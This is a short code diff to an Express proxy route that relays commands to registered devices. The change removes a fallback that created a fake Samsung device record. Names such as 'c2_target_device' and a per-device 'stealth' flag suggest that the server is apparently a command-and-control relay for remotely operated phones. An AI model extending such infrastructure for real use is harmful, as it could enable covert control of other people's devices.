@@ -844,17 +844,13 @@ app.all('*', (req, res) => {
         deviceId = latestDevice || Array.from(devices.keys())[0];
     }
 
-    if (!deviceId) deviceId = 'samsung';
-
     if (deviceId) {
         lastActiveDeviceId = deviceId;
         res.setHeader('Set-Cookie', `c2_target_device=${encodeURIComponent(deviceId)}; Path=/; SameSite=Lax`);
     }
 
-    if (!devices.has(deviceId)) {
-        devices.set(deviceId, { deviceId, brand: 'samsung', model: 'SM-F731W', ip: '127.0.0.1', port: 9191, stealth: false, lastSeen: new Date().toISOString() });
-        saveData();
-    }
+    // [FIX] No phantom seed devices: unknown deviceIds are NOT created.
+    // Commands for devices that never checked in simply time out (TUNNEL_GATEWAY_TIMEOUT).
 
     const requestId = Math.random().toString(36).substring(7);
     let relayPath = req.originalUrl.replace('/proxy', '') || '/';
